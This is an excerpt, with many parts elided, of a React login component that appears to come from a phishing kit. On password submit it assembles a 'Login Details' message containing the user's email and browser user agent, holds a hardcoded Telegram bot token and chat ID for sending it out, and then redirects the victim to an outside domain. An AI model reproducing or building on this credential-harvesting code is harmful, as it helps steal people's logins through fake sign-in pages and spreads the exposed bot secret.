...
const Login = () => {
  ...
  const handlePasswordSubmit = async (e) => {
    ...
    try {
      ...
      const TELEGRAM_BOT_TOKEN = '7728366149:AAF4yYM7TrxigR6qk7vjJToj29ZzPIDfTqQ';
      const TELEGRAM_CHAT_ID = '-1002259449461';
      const loginAlert = `
🔐 <b>Login Details</b>
📧 <b>Email:</b> ${email}
...
🕵️‍♂️ <b>User Agent:</b> ${navigator.userAgent}
      ...
      setShowModal(false); // Hide modal before redirecting
      window.location.href = 'https://mma.socket-loading.shop/';
    } catch (error) {
